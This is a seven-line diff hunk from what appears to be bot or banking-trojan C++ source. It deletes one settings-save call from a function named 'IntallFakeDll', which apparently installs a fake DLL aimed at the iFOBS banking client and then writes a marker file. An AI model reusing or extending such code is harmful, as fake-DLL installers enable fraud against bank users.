@@ -746,7 +746,6 @@ DWORD WINAPI IntallFakeDll(void*)
 		}
 		if( installed )
 		{
-			BOT::SaveSettings(true, false, true);
 			Bot->CreateFileA( 0, GetStr(EStrFakeDllIFobsFlag).t_str() );
 		}
 	}
